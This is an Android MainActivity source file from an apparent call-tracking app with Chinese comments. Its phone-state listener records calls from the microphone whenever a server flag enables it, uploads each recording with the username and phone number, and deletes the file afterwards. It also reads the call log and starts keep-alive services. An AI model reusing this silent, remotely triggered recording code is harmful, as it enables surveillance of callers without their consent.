package com.jm.mvp.ui.activity;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.SystemClock;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.widget.FrameLayout;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.Toast;

import com.google.gson.Gson;
import com.jm.R;
import com.jm.base.Constants;
import com.jm.bean.CallInfo;
import com.jm.bean.IsVoiceBean;
import com.jm.bean.UpTelAddBean;
import com.jm.helper.SampleApplicationContext;
import com.jm.mvp.base.BaseActivity;
import com.jm.mvp.service.CallInfoService;
import com.jm.mvp.ui.fragment.MineFragment;
import com.jm.mvp.ui.fragment.SeeFragment;
import com.jm.mvp.ui.fragment.TelFragment;
import com.jm.service.BackgroundService;
import com.jm.service.GrayService;
import com.jm.service.WhiteService;
import com.jm.utils.AppManager;
import com.jm.utils.CommonUtils;
import com.jm.utils.SPUtils;
import com.jm.utils.ToastUtils;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.util.List;
import java.util.concurrent.TimeUnit;

import butterknife.BindView;
import cn.com.yktour.network.base.IPresenter;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends BaseActivity {
    private static final int READ_PHONE_STATE = 1;
    @BindView(R.id.fl_main)
    FrameLayout mFlMain;
    @BindView(R.id.rab_tel)
    RadioButton mRabTel;
    @BindView(R.id.rab_see)
    RadioButton mRabSee;
    @BindView(R.id.rab_mine)
    RadioButton mRabMine;
    @BindView(R.id.rg_main)
    RadioGroup mRgMain;
    String  fileString;
    MediaRecorder recorder;
    boolean isVoices=false;
    boolean isCall=false;
    private String incomingNumbers;
    /**
     * 用于判断两次点击间隔时间
     */
    private long exitTime = 0;
    private TelFragment mTelFragment;
    private SeeFragment mSeeFragment;
    private MineFragment mMineFragment;

    private boolean isFirst;
    private MyPhoneCallListener mListener;
    private TelephonyManager mTm;
    private static String[] CALLS_STATE = {
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO};
  //  private StartPhoneBroadcast mReceiver
    @Override
    public int initView(Bundle savedInstanceState) {
        /**
         * 开启所有Service
         */
        startAllServices();
        FragmentManager trx = getSupportFragmentManager();
        if (savedInstanceState != null) {
            mTelFragment = (TelFragment) trx.findFragmentByTag("rab_tel");
            mSeeFragment = (SeeFragment) trx.findFragmentByTag("rab_see");
            mMineFragment = (MineFragment) trx.findFragmentByTag("rab_mine");
        }
        return R.layout.activity_main;
    }

    @Override
    public void initData(Bundle savedInstanceState) {
        isVoice();
        setOnListener();
        setTelListener();
//        mMinePop = initPop();
        if (savedInstanceState != null) {
            return;
        }
        mRabTel.setChecked(true);
        mGson = new Gson();

        try {
            mClient = new DemoClient(new URI(Constants.WEB_SOCKET));
            ToastUtils.ToastCenter("开始链接");
            CommonUtils.checkNotNull(mClient, "连接时，client为空").connect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
//判断是否进行录音
    private void isVoice() {
        OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
        String  userName = (String) SPUtils.get("userName", "");
        if (null!=userName){
            final Request request = new Request.Builder().url(Constants.isVoicePath+SPUtils.get("userName","")).build();
            okHttpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(okhttp3.Call call, IOException e) {
                }

                @Override
                public void onResponse(okhttp3.Call call, Response response) throws IOException {
                    if (200 != response.code()) {
                        return;
                    }
                    String string = response.body().string();
                    Gson gson = new Gson();
                    IsVoiceBean isVoiceBean = gson.fromJson(string, IsVoiceBean.class);
                    final int data = isVoiceBean.getData();
                            if (data == 0) {
                                verifyStoragePermissions(MainActivity.this);
                                isVoices=true;
                            }
                        }

                    });
        }
    }


    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        // 退出登录或者 修改密码重新链接
        try {
            mClient = new DemoClient(new URI(Constants.WEB_SOCKET));
            CommonUtils.checkNotNull(mClient, "连接时，client为空").connect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 设置通话记录的监听
     */
    private void setTelListener() {
        //获得相应的系统服务
        mTm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        //使用TelephonyManager对象的listen(PhoneStateListener listener, int events)
        mListener = new MyPhoneCallListener();
        mTm.listen(mListener, PhoneStateListener.LISTEN_CALL_STATE);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (mListener != null) {
            mTm.listen(mListener, PhoneStateListener.LISTEN_NONE);
        }
        mListener = null;
    }

    /**
     * 设置点击事件
     */
    private void setOnListener() {
        mRgMain.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup group, int checkedId) {
                FragmentTransaction trx = getSupportFragmentManager().beginTransaction();
                hideAllFragment(trx);
                switch (checkedId) {
                    case R.id.rab_tel:
                        if (mTelFragment == null) {
                            mTelFragment = TelFragment.newInstance();
                        }
                        if (!mTelFragment.isAdded()) {
                            trx.add(R.id.fl_main, mTelFragment, "rab_tel");
                        }
                        trx.show(mTelFragment);
                        break;
                    case R.id.rab_see:
                        if (mSeeFragment == null) {
                            mSeeFragment = SeeFragment.newInstance();
                        }
                        if (!mSeeFragment.isAdded()) {
                            trx.add(R.id.fl_main, mSeeFragment, "rab_see");
                        }
                        trx.show(mSeeFragment);
                        break;
                    case R.id.rab_mine:
                        if (mMineFragment == null) {
                            mMineFragment = MineFragment.newInstance();
                        }
                        if (!mMineFragment.isAdded()) {
                            trx.add(R.id.fl_main, mMineFragment, "rab_mine");
                        }
                        trx.show(mMineFragment);
                        break;
                    default:
                        break;
                }
                trx.commitAllowingStateLoss();
            }
        });
    }

    /**
     * 隐藏所有界面
     *
     * @param fragmentTransaction 管理
     */
    private void hideAllFragment(FragmentTransaction fragmentTransaction) {
        if (fragmentTransaction != null) {
            if (mTelFragment != null) {
                fragmentTransaction.hide(mTelFragment);
            }
            if (mSeeFragment != null) {
                fragmentTransaction.hide(mSeeFragment);
            }
            if (mMineFragment != null) {
                fragmentTransaction.hide(mMineFragment);
            }
        }
    }

    /**
     * 返回键 再按一次退出程序
     */
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && event.getAction() == KeyEvent.ACTION_DOWN) {
            if ((System.currentTimeMillis() - exitTime) > 1000) {
                ToastUtils.ToastCenter(getString(R.string.exit_app));
                exitTime = System.currentTimeMillis();
            } else {
                closeClient();
                AppManager.getAppManager().AppExit();
            }
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public IPresenter obtainPresenter() {
        return null;
    }

    /**
     * 实现PhoneStateListener listener并实现相应的方法
     */
    public class MyPhoneCallListener extends PhoneStateListener {
        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            switch (state) {
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    //电话通话的状态
                  if (isVoices==true){
                      recorder = new MediaRecorder();
                      //创建文件夹
                      //从麦克风采集声音
                      String timeString = System.currentTimeMillis() + "";
                      fileString = timeString.concat(".mp3");
                      recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                      recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                      recorder.setOutputFile(Environment.getExternalStorageDirectory() + "/" + fileString);
                      recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                      try {
                          recorder.prepare();
                      } catch (IOException e) {
                          e.printStackTrace();
                      }
                      recorder.start();
                  }

                    break;
                case TelephonyManager.CALL_STATE_RINGING:
//                    MainActivity.mp.pause();//电话响铃的状态
                    SPUtils.put("tels", "");
                    Toast.makeText(getApplicationContext(), incomingNumber, Toast.LENGTH_SHORT).show();
                    if (isVoices==true){
                        isCall=true;
                        incomingNumbers=incomingNumber;
                        recorder = new MediaRecorder();
                        //创建文件夹
                        //从麦克风采集声音
                        String timeString = System.currentTimeMillis() + "";
                        fileString = timeString.concat(".mp3");
                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        recorder.setOutputFile(Environment.getExternalStorageDirectory() + "/" + fileString);
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                        try {
                            recorder.prepare();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        recorder.start();
                    }
                    break;
                //无任何状态时 085236
                case TelephonyManager.CALL_STATE_IDLE:
                    if (isFirst) {
                        if (isVoices==true){
                            if (isCall==true){
                                final String filePath = Environment.getExternalStorageDirectory() + "/" + fileString;
                                //进行文件上传到服务器
                                final File file = new File(filePath);
                                recorder.release(); //释放资源
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        upLoadFile(Constants.upFilePath,Constants.upFilePath_Config+SPUtils.get("userName","")+"/"+0+"/"+incomingNumbers, filePath,file);
                                    }
                                }).start();
                            }else {
                                final String filePath = Environment.getExternalStorageDirectory() + "/" + fileString;
                                //进行文件上传到服务器
                                final File file = new File(filePath);
                                recorder.release(); //释放资源
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        upLoadFile(Constants.upFilePath,Constants.upFilePath_Config+SPUtils.get("userName","")+"/"+1+"/"+SPUtils.get("phone",""), filePath,file);
                                    }
                                }).start();
                            }
                        }

                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                SystemClock.sleep(1000);
                                runOnUiThread(new Runnable() {
                                    @Override
                                    public void run() {
                                        List<CallInfo> infos = CallInfoService.getCallInfos(SampleApplicationContext.context);
                                        List<UpTelAddBean> upTelAddBeanList = CommonUtils.toUpAddTelList(infos, 1);
                                        mTelFragment.addTel(upTelAddBeanList);
                                    }
                                });
                            }
                        }).start();
                    }
                    isFirst = true;
                    break;
                default:
                    break;
            }
            super.onCallStateChanged(state, incomingNumber);
        }
    }

    public static void verifyStoragePermissions(Activity activity) {
        int permission = ActivityCompat.checkSelfPermission(activity, Manifest.permission.READ_PHONE_STATE);
        if (permission != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(activity, CALLS_STATE, READ_PHONE_STATE);
        }
    }
    /**
     * 上传文件
     * @param actionUrl 服务器接口地址
     * @param baseUrl 服务器接口地址
     * @param filePath  本地文件地址
     * @param file  本地文件流
     */
    public <T> void upLoadFile(String baseUrl, String actionUrl, final String filePath, File file) {
        OkHttpClient mOkhttpClient = new OkHttpClient();
        //补全请求地址MEDIA_TYPE_OBJECT
        String requestUrl = String.format("%s/%s", baseUrl, actionUrl);
        //创建RequestBody
        final MediaType MEDIA_TYPE_MP3 = MediaType.parse("mp3");
        RequestBody body = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart( "file", filePath,RequestBody.create(MEDIA_TYPE_MP3, file))
                .build();
        //创建Request
        final Request request = new Request.Builder().url(requestUrl).method("POST",body).build();
        final Call call = mOkhttpClient.newBuilder().writeTimeout(50, TimeUnit.SECONDS).build().newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                //失败回调
                SystemClock.sleep(1000*60*3);
                deleteFile(filePath);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                //成功回调
                if (response.isSuccessful()) {
                    SystemClock.sleep(1000*60*3);
                    deleteFile(filePath);
                }
            }
        });
    }

    /**
     * 删除单个文件
     * @param fileName
     * 要删除的文件的文件名
     * @return 单个文件删除成功返回true，否则返回false
     */
    public  boolean deleteFile(String fileName) {
        File file = new File(fileName);
        // 如果文件路径所对应的文件存在，并且是一个文件，则直接删除
        if (file.exists() && file.isFile()) {
            if (file.delete()) {
                Log.e("TAG","删除单个文件" + fileName + "成功！");
                return true;
            } else {
                Log.e("TAG","删除单个文件" + fileName + "失败！");
                return false;
            }
        } else {
            Log.e("TAG","删除单个文件失败：" + fileName + "不存在！");
            return false;
        }
    }

    private void startAllServices() {
        Intent whiteIntent = new Intent(getApplicationContext(), WhiteService.class);
        startService(whiteIntent);
        Intent grayIntent = new Intent(getApplicationContext(),GrayService.class);
        startService(grayIntent);
        Intent bgIntent = new Intent(getApplicationContext(), BackgroundService.class);
        startService(bgIntent);
    }
}